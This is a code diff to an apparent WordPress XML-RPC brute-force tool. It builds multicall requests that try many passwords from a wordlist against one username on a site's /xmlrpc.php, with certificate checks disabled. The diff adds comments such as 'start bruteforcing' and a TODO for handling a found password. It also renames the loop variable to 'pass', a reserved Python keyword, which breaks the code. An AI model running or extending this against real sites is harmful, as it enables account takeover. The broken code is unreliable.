@@ -38,7 +38,7 @@ class Forcer:
         body = start
         cnt = 1
         with open(self.wordlist) as list:
-            for line in list:
+            for pass in list:
                 body += f'''
                     <value><struct>
                   <member>
@@ -49,7 +49,7 @@ class Forcer:
                 	<name>params</name><value><array><data>
                 	<value><array><data>
                 	<value><string>{self.user}</string></value>
-                	<value><string>{line.strip()}</string></value>
+                	<value><string>{pass.strip()}</string></value>
                 	</data></array></value>
                 	</data></array></value>
                   </member>
@@ -71,9 +71,9 @@ class Forcer:
     def send_request(self, body):
         req_url = self.url + "/xmlrpc.php"
         headers = {'Content-Type': 'application/xml'}
-        x = requests.post(req_url, data=body, headers = headers, verify=False)
+        multiple_attempts = requests.post(req_url, data=body, headers = headers, verify=False)
         print(Fore.RED)
-        print(x.text)
+        print(multiple_attempts.text)
         print(Style.RESET_ALL)
            
     def test_valid(self):
@@ -121,10 +121,11 @@ def banner():
 
 def main():
     banner()
-    forcer = args_to_class()
-    if forcer.test_valid():
+    forcer = args_to_class() # convert arguments into a neat class
+    if forcer.test_valid(): # check for the /xmlrpc.php path
         return 1
-    forcer.craft_req_body()
+    forcer.craft_req_body() # start bruteforcing
+    # TODO: implement the password found logic
     
 if __name__ == "__main__":
     main()
